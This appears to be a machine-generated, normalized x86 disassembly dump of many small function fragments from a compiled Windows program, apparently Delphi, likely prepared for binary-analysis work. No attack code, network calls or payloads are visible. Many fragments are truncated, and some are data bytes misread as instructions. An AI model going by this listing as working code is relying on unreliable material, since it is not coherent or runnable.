sub_46f627
jmp sub_4046f8
sub_46f62e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46f6ea
jmp sub_4046f8
sub_46f6f1
pop ecx
pop ecx
pop ebp
retn
sub_46f84c
jmp sub_4046f8
sub_46f853
pop ebp
retn
sub_46f8ab
jmp sub_4046f8
sub_46f8b2
pop ebp
retn
sub_46f9b6
jmp sub_4046f8
sub_46f9bd
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46fa45
jmp sub_4046f8
sub_46fa4c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46fb1d
jmp sub_4046f8
sub_46fb24
pop ebp
retn
sub_4700b5
jmp sub_4046f8
sub_4700bc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47017d
jmp sub_4046f8
sub_470184
pop ecx
pop ecx
pop ebp
retn
sub_470206
jmp sub_4046f8
sub_47020d
pop ecx
pop ecx
pop ebp
retn
sub_470625
jmp sub_404444
sub_470662
jmp sub_4046f8
sub_470669
fld [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4706bc
mov ecx 0x20019
mov dl 0x1
mov eax [ r-xdata ]
call sub_420dc4
retn
sub_470750
jmp sub_4046f8
sub_470757
pop ebx
pop ecx
pop ebp
retn
sub_47081d
jmp sub_4046f8
sub_470824
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470921
jmp sub_4046f8
sub_470928
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_470a51
jmp sub_4046f8
sub_470a58
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_470b3b
jmp sub_4046f8
sub_470b42
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_470caa
jmp sub_404444
sub_470cdf
jmp sub_4046f8
sub_470ce6
fld [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470d9c
jmp sub_4046f8
sub_470da3
fld [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_471616
jmp sub_4046f8
sub_47161d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403f64
retn
sub_471633
jmp sub_4046f8
sub_47165d
jmp sub_4046f8
sub_471664
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4717cb
[ edi ]
sub_471d97
jmp [ edx ]
sub_471ecb
jmp [ eax + eax ]
sub_471efb
jmp [ edx ]
sub_471f4b
jmp [ edx ]
sub_47200b
jmp [ ecx ]
sub_472057
jmp [ ebx ]
sub_47219b
jmp [ eax ]
sub_472257
[ edx ]
sub_47228b
[ edi ]
sub_47230b
jmp [ eax ]
sub_4723d7
jmp [ edx ]
sub_47244f
jmp [ eax ]
sub_47247b
jmp [ edx ]
sub_4724a7
jmp [ esi ]
sub_4724d7
jmp [ esi ]
sub_472507
[ eax ]
sub_4726a3
jmp [ edx ]
sub_472a4f
jmp sub_4046f8
sub_472a56
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_472aeb
jmp sub_4046f8
sub_472af2
pop ebx
pop ecx
pop ebp
retn
sub_472c56
jmp sub_4046f8
sub_472c5d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_472df9
jmp sub_4046f8
sub_472e00
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_472e96
jmp sub_4046f8
sub_472e9d
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_473288
jmp sub_4046f8
sub_47328f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4732a4
mov edx [ rw-data ]
movzx eax al
bt [ edx ] eax
setb al
retn
sub_47332f
jmp sub_4046f8
sub_473336
pop ebp
retn
sub_47361c
jmp sub_4046f8
sub_473623
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4736f2
jmp sub_404444
sub_47378c
jmp sub_4046f8
sub_473793
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4737fa
jmp sub_4046f8
sub_473801
pop ebx
pop ecx
pop ebp
retn
sub_473b7f
jmp sub_4046f8
sub_473b86
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_473c5d
jmp sub_4046f8
sub_473c64
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_473cbf
jmp sub_4046f8
sub_473cc6
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x4
sub_473d1a
jmp sub_4046f8
sub_473d21
pop ecx
pop ebp
retn 0x8
sub_473d28
push ebx
mov ebx eax
mov eax ebx
call sub_4173a4
pop ebx
retn
sub_473d78
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41751c
pop esi
pop ebx
retn
sub_473eee
jmp sub_4046f8
sub_473ef5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_474072
jmp sub_4046f8
sub_474079
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4742db
jmp sub_4046f8
sub_4742e2
pop ebx
pop ecx
pop ebp
retn
sub_4742e8
xor eax eax
retn
sub_4746fc
jmp sub_4046f8
sub_474703
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_474864
call sub_4650ac
mov eax [ r-xdata ]
call sub_46f858
retn
sub_4748b0
jmp sub_4046f8
sub_4748b7
pop ebp
retn
sub_4748bc
or [ eax ] eax
add [ eax ] al
hlt
sub_474b36
jmp sub_4046f8
sub_474bba
jmp sub_4046f8
sub_474bc1
pop ebx
pop ecx
pop ebp
retn
sub_474c04
push ebx
mov ecx edx
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x14 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x68 ]
pop ebx
retn
sub_474dab
jmp sub_4046f8
sub_474db2
pop ebx
mov esp ebp
pop ebp
retn
sub_474ed7
jmp sub_4046f8
sub_474ede
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_474fb0
push ebx
lea edx [ eax + 0x24 ]
push edx
lea ecx [ eax + 0x1c ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x14 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_474fcc
push ebx
lea edx [ eax + 0x28 ]
push edx
lea ecx [ eax + 0x20 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x14 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x2c ]
pop ebx
retn
sub_475064
jmp sub_404444
sub_475160
jmp sub_4046f8
sub_475167
pop ecx
pop ebp
retn
sub_475324
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebx + 0xc ]
call sub_404e44
pop ebx
retn
sub_475362
call sub_475400
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_475400
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x18 ] eax
pop ebx
retn
sub_47548f
jmp sub_4046f8
sub_475496
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4754fc
jmp sub_4046f8
sub_475503
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_475508
push esi
mov esi eax
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_475565
jmp sub_4046f8
sub_47556c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_475574
xor ecx ecx
mov edx [ eax + 0xc ]
mov eax [ r-xdata ]
call sub_462668
retn
sub_47565d
jmp sub_4046f8
sub_475664
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4756ac
mov al 0x1
retn
sub_4756b0
xor eax eax
retn
sub_4756b4
mov edx [ eax ]
call [ edx + 0x20 ]
retn
sub_4756bc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebx + 0x10 ]
pop ebx
retn
sub_475871
jmp sub_4046f8
sub_475878
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47593f
jmp sub_4046f8
sub_475946
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_475a89
jmp sub_4046f8
sub_475a90
pop ebx
pop ecx
pop ebp
retn
sub_475c7b
jmp sub_4046f8
sub_475c82
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_475dac
jmp sub_4046f8
sub_475db3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_475e0a
jmp sub_4046f8
sub_475e11
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_475fa4
jmp sub_4046f8
sub_475fab
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_475fb4
mov eax [ eax + 0x4 ]
call sub_406248
retn
sub_476198
jmp sub_4046f8
sub_47619f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4765aa
jmp sub_4046f8
sub_4765b1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4765e0
push ebx
mov ebx eax
mov eax ebx
call sub_4650ac
mov [ ebx + 0x38 ] 0x1
pop ebx
retn
sub_4776cc
push ebx
mov ebx eax
mov eax [ ebx + 0x9c ]
test eax eax
je r-xdata
mov [ ebx + 0xac ] 0x0
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x38 ]
sub_477744
retn
sub_4777dc
mov ecx edx
mov [ eax + 0x9c ] ecx
test ecx ecx
je r-xdata
retn
mov edx eax
mov eax ecx
call sub_41db30
sub_4777f4
mov [ rw-data ] eax
call sub_477810
retn
sub_477800
mov ecx edx
mov eax [ rw-data ]
mov dl 0x1
call sub_4650b8
retn
sub_47784c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x90 ]
call sub_404e98
pop esi
pop ebx
retn
sub_477864
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x90 ]
mov edx esi
call sub_404e98
pop esi
pop ebx
retn
sub_47787c
push ebx
mov ebx eax
mov eax ecx
cdq
push edx
push eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
pop ebx
retn
sub_477902
jmp sub_4046f8
sub_477909
pop ecx
pop ebp
retn
sub_477966
jmp sub_4046f8
sub_47796d
pop esi
pop ecx
pop ebp
retn
sub_477974
mov edx [ eax + 0xc8 ]
test edx edx
je r-xdata
retn
mov eax edx
call sub_475974
sub_477988
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb4 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb8 ]
pop ebx
retn
sub_4779f3
jmp sub_4046f8
sub_4779fa
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_477a49
jmp sub_4046f8
sub_477a50
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_477ab6
jmp sub_4046f8
sub_477abd
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_477b2a
jmp sub_4046f8
sub_477b31
pop esi
pop ecx
pop ebp
retn 0x8
sub_477bdd
jmp sub_4046f8
sub_477be4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477c01
lea eax [ ebp - 0xc ]
call sub_404e44
retn
sub_477bfa
jmp sub_4046f8
sub_477c01
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477c56
jmp sub_4046f8
sub_477c5d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_477cc9
jmp sub_4046f8
sub_477cd0
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_477d4f
jmp sub_4046f8
sub_477d56
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477fba
jmp sub_4046f8
sub_477fc1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47804f
jmp sub_4046f8
sub_478056
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47826d
jmp sub_4046f8
sub_478274
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47829f
lea eax [ ebp - 0xc ]
call sub_404e44
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
sub_478298
jmp sub_4046f8
sub_47829f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_478383
jmp sub_4046f8
sub_47838a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4783b8
mov [ eax + 0xb0 ] edx
retn
sub_4785fe
jmp sub_404570
sub_4786ae
jmp sub_4046f8
sub_478735
jmp sub_4046f8
sub_47873c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47875f
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
sub_478758
jmp sub_4046f8
sub_47875f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4787b2
jmp sub_4046f8
sub_4787b9
pop ecx
pop ebp
retn
sub_478871
jmp sub_4046f8
sub_478882
jmp sub_404444
sub_478887
call sub_404854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4788ab
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
retn
sub_4788a4
jmp sub_4046f8
sub_4788ab
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_478a21
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
retn
sub_478a39
jmp sub_4046f8
sub_478a63
jmp sub_4046f8
sub_478a6a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_478cb6
jmp sub_4046f8
sub_478cbd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_478cd4
mov edx [ eax + 0x98 ]
test edx edx
jne r-xdata
cmp [ edx + 0x20 ] 0x0
sete al
retn
mov al 0x1
retn
sub_478d78
jmp sub_4046f8
sub_478d7f
pop esi
pop ecx
pop ebp
retn
sub_478e49
jmp sub_4046f8
sub_478e50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478e72
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404e68
retn
sub_478e6b
jmp sub_4046f8
sub_478e72
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478e80
mov [ eax + 0x89 ] 0x1
retn
sub_478e88
push ebx
mov ebx eax
mov eax ebx
call sub_474864
mov [ ebx + 0xc0 ] 0x8000
mov [ ebx + 0xc4 ] 0x8000
mov [ ebx + 0xa8 ] 0x4000
mov [ ebx + 0xa0 ] 0xffffffff
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0xb8 ] 0xffffffff
pop ebx
retn
sub_478ed0
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xbc ]
retn
sub_478edc
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xc0 ]
retn
sub_478f46
jmp sub_4046f8
sub_478f4d
pop ebp
retn
sub_4792a7
jmp sub_4046f8
sub_4792ae
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4792ff
jmp sub_4046f8
sub_479306
pop ebx
pop ecx
pop ebp
retn 0x8
sub_47930c
retn
sub_479310
push ebx
cmp cl 0x1
jne r-xdata
call sub_41dd8c
pop ebx
retn
cmp edx [ eax + 0x9c ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x9c ] ebx
sub_4793fa
jmp sub_4046f8
sub_479401
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_479452
jmp sub_4046f8
sub_479459
pop ecx
pop ebp
retn
sub_4794a7
jmp sub_4046f8
sub_4794ae
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4794ff
jmp sub_4046f8
sub_479506
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_47955b
jmp sub_4046f8
sub_479562
pop ebx
pop ecx
pop ebp
retn 0xc
sub_479747
jmp sub_4046f8
sub_47974e
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_479898
jmp sub_4046f8
sub_47989f
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_479928
jmp sub_4046f8
sub_47992f
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_479999
jmp sub_4046f8
sub_4799a0
pop ebx
pop ecx
pop ebp
retn
sub_479ab6
jmp sub_4046f8
sub_479abd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_479b65
fiadd [ ecx ]
or al 0xfa
inc edi
add ah dl
fiadd [ ecx ]
int3
sub_479cc5
fiadd [ ecx ]
or al 0xfa
inc edi
add ah dl
fiadd [ ecx ]
int3
sub_479ef8
push ebx
mov ebx eax
mov eax ebx
call sub_47fd6c
mov [ ebx + 0xd8 ] 0xffffffff
pop ebx
retn
sub_47a14e
jmp sub_404444
sub_47a19b
jmp sub_4046f8
sub_47a1a2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47a1f8
jmp sub_4046f8
sub_47a1ff
pop ebx
pop ecx
pop ebp
retn
sub_47a204
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_47a224
mov [ eax + 0xb8 ] edx
mov ecx [ eax + 0x8c ]
test ecx ecx
je r-xdata
retn
mov [ ecx + 0x8c ] edx
sub_47a23c
mov [ eax + 0xd8 ] edx
mov ecx [ eax + 0x8c ]
test ecx ecx
je r-xdata
retn
mov [ ecx + 0xb8 ] edx
sub_47a284
mov [ eax + 0xac ] edx
mov ecx [ eax + 0xa0 ]
test ecx ecx
je r-xdata
retn
mov [ ecx + 0xd8 ] edx
sub_47a2e8
mov [ eax + 0xc4 ] dl
mov ecx [ eax + 0xa0 ]
test ecx ecx
je r-xdata
retn
mov [ ecx + 0x105 ] dl
sub_47a444
mov edx eax
mov eax [ r-xdata ]
call sub_477800
retn
sub_47a454
mov edx [ eax + 0x8c ]
test edx edx
je r-xdata
mov eax [ eax + 0xd8 ]
retn
mov eax [ edx + 0xb8 ]
retn
sub_47a575
jmp sub_4046f8
sub_47a57c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47a85d
jmp sub_4046f8
sub_47a864
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47a92c
jmp sub_4046f8
sub_47a933
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47afc9
jmp sub_4046f8
sub_47afd0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b586
jmp sub_404444
sub_47b626
jmp sub_4046f8
sub_47b62d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47b783
jmp sub_4046f8
sub_47b78a
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47b8bd
jmp sub_4046f8
sub_47b962
jmp sub_4046f8
sub_47ba76
jmp sub_4046f8
sub_47ba7d
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_47bb4d
jmp sub_404444
sub_47bda8
jmp sub_404444
sub_47be0a
jmp sub_4046f8
sub_47be11
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47c104
jmp sub_404444
sub_47c154
jmp sub_4046f8
sub_47c184
jmp sub_4046f8
sub_47c18b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47c1d0
movzx eax [ eax + 0xa1 ]
dec eax
sub al 0x3
setb al
retn
j_sub_404570#9
jmp sub_404570
j_sub_404570#6
jmp sub_404570
sub_47c5b8
jmp sub_4046f8
sub_47c5bf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47c703
jmp sub_404444
sub_47cbad
jmp sub_404444
sub_47cbfd
jmp sub_4046f8
sub_47cc43
jmp sub_4046f8
sub_47cc4a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47d1b5
jmp sub_4046f8
sub_47d1bc
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47d457
jmp sub_4046f8
sub_47d45e
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47d474
push esi
mov esi [ eax + 0xa4 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
sub_47d5e4
jmp sub_404444
sub_47d8d6
jmp sub_404444
sub_47d90b
jmp sub_404570
sub_47d96b
jmp sub_4046f8
sub_47d972
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47d9fa
jmp sub_4046f8
sub_47da01
pop ecx
pop ebp
retn
sub_47da67
jmp sub_4046f8
sub_47da6e
pop ebx
pop ecx
pop ebp
retn 0x8
sub_47dd95
jmp sub_4046f8
sub_47dd9c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47defa
jmp sub_4046f8
sub_47dfb9
jmp sub_4046f8
sub_47e112
jmp sub_4046f8
sub_47e119
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47e25c
jmp sub_4046f8
sub_47e263
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_47e314
jmp sub_4046f8
sub_47e31b
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_47e6f0
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_47e710
push ebx
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_47e730
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_47e7c8
jmp sub_4046f8
sub_47e7cf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47e90d
jmp sub_4046f8
sub_47e914
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47ea6c
push ebx
mov ebx eax
cmp [ ebx + 0x100 ] 0x0
jne r-xdata
mov eax [ ebx + 0x100 ]
pop ebx
retn
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4650b8
mov [ ebx + 0x100 ] eax
sub_47ea94
cmp dl [ eax + 0x104 ]
je r-xdata
retn
mov ecx edx
mov [ eax + 0x104 ] cl
mov edx ecx
call sub_47eaac
sub_47eae4
push ebx
cmp cl 0x1
jne r-xdata
call sub_4777ac
pop ebx
retn
cmp edx [ eax + 0x100 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x100 ] ebx
sub_47eb04
push ebx
mov ebx eax
mov eax ebx
call sub_478e88
mov [ ebx + 0x104 ] 0x1
mov [ ebx + 0x105 ] 0x0
pop ebx
retn
sub_47eb79
fiadd [ ecx ]
in al 0xea
inc edi
add ah dl
fiadd [ ecx ]
int3
sub_47eeed
jmp sub_4046f8
sub_47eef4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ef11
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
sub_47ef0a
jmp sub_4046f8
sub_47ef11
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47f151
jmp sub_4046f8
sub_47f158
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47f160
mov eax [ eax + 0xd0 ]
call sub_474ee4
retn
sub_47f35d
jmp sub_4046f8
sub_47f451
jmp sub_4046f8
sub_47f458
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
j_sub_404570#5
jmp sub_404570
sub_47f534
add [ eax ] eax
add [ eax ] al
in al dx
0xf5400046 0x47
j_sub_404570#4
jmp sub_404570
sub_47f5dd
jmp sub_4046f8
sub_47f5e4
pop ebp
retn
sub_47f641
fiadd [ ecx ]
or al 0xfa
inc edi
add ah dl
fiadd [ ecx ]
int3
sub_47f8b7
jmp sub_4046f8
sub_47f8be
pop ecx
pop ebp
retn
sub_47f8c4
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_47f976
jmp sub_4046f8
sub_47f97d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47f984
mov eax [ eax + 0x90 ]
mov edx [ eax ]
call [ edx + 0x3c ]
retn
sub_47f9f9
jmp sub_4046f8
sub_47fa00
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_47fb39
jmp sub_4046f8
sub_47fb40
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47fc60
jmp sub_4046f8
sub_47fc67
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fc84
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_47fc7d
jmp sub_4046f8
sub_47fc84
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47fce0
jmp sub_4046f8
sub_47fce7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47fd5b
jmp sub_4046f8
sub_47fd62
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_47fdb0
mov ecx r-xdata
mov edx [ eax + 0x8c ]
mov eax [ r-xdata ]
call sub_463268
retn
sub_47fde8
retn
sub_47fdec
retn
sub_480455
jmp sub_4046f8
sub_48045c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48052b
jmp sub_4046f8
sub_480532
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4806a4
jmp sub_4046f8
sub_4806ab
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480901
jmp sub_4046f8
sub_480908
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4809b7
jmp sub_4046f8
sub_4809be
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480a8f
jmp sub_4046f8
sub_480a96
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480ac0
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_480ab9
jmp sub_4046f8
sub_480ac0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480b6b
jmp sub_4046f8
sub_480b9a
jmp sub_4046f8
sub_480ba1
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_480c71
jmp sub_4046f8
sub_480c78
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480de9
jmp sub_4046f8
sub_480df0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480e8c
jmp sub_4046f8
sub_480e93
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480f6b
jmp sub_4046f8
sub_480f72
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480fd5
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
sub_481164
jmp sub_4046f8
sub_48116b
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4811cd
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
sub_4812ed
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
sub_4814ac
jmp sub_4046f8
sub_4814b3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_48180f
jmp sub_4046f8
sub_481816
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4818ea
jmp sub_4046f8
sub_4818f1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_481ce2
jmp sub_4046f8
sub_481ce9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_481d49
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
sub_481e4d
jmp sub_4046f8
sub_4821e4
jmp sub_4046f8
sub_4821eb
pop ebx
mov esp ebp
pop ebp
retn
sub_482254
jmp sub_4046f8
sub_48225b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4823c3
jmp sub_4046f8
sub_4823ca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
